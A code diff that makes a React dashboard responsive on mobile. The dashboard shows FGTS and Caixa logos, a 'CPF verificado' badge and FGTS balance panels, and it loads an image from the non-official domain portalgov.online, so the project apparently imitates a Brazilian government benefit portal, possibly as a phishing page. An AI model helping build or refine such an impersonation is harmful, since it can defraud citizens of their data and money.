@@ -6,6 +6,7 @@ import FGTSLogo from '@/components/FGTSLogo';
 import { Dialog, DialogContent } from "@/components/ui/dialog";
 import { Button } from '@/components/ui/button';
 import { useNavigate } from 'react-router-dom';
+import { useIsMobile } from '@/hooks/use-mobile';
 
 interface UserData {
   DADOS: {
@@ -21,6 +22,7 @@ const Dashboard = () => {
   const [fullName, setFullName] = useState('');
   const [showPopup, setShowPopup] = useState(false);
   const navigate = useNavigate();
+  const isMobile = useIsMobile();
   
   useEffect(() => {
     try {
@@ -88,13 +90,13 @@ const Dashboard = () => {
   return (
     <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
       {/* Header */}
-      <div className="p-6 flex justify-between items-center">
-        <FGTSLogo className="h-10" />
-        <CaixaLogo className="h-10" />
+      <div className="p-4 sm:p-6 flex justify-between items-center">
+        <FGTSLogo className={`${isMobile ? 'h-8' : 'h-10'}`} />
+        <CaixaLogo className={`${isMobile ? 'h-8' : 'h-10'}`} />
       </div>
 
       {/* Welcome */}
-      <div className="p-6">
+      <div className="p-4 sm:p-6">
         <div className="text-white text-2xl font-light">Olá</div>
         <div className="text-white opacity-60 text-lg">{fullName}</div>
         <div className="text-white opacity-60 text-xs mt-1">CPF verificado</div>
@@ -102,7 +104,7 @@ const Dashboard = () => {
 
       {/* Main content */}
       <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
-        <div className="p-6">
+        <div className="p-4 sm:p-6">
           {/* Meu FGTS */}
           <div className="mb-6">
             <h2 className="text-[#005CA9] text-2xl font-bold mb-2">Meu FGTS</h2>
@@ -133,7 +135,7 @@ const Dashboard = () => {
           </div>
 
           {/* Two column layout */}
-          <div className="grid grid-cols-2 gap-4 mb-4">
+          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-4">
             {/* Last deposit */}
             <div className="bg-gray-100 rounded-lg p-4">
               <div className="text-gray-500 text-sm">O último</div>
@@ -159,7 +161,7 @@ const Dashboard = () => {
           </div>
 
           {/* Additional options */}
-          <div className="grid grid-cols-2 gap-4">
+          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
             {/* Saque Aniversário */}
             <div className="bg-[#1E88E5] rounded-lg p-4 text-white relative">
               <div className="font-bold">Saque</div>
@@ -221,7 +223,7 @@ const Dashboard = () => {
               <img 
                 src="https://portalgov.online/credito.png" 
                 alt="Crédito" 
-                className="h-14 object-contain" 
+                className="w-full object-contain" 
               />
             </div>
             
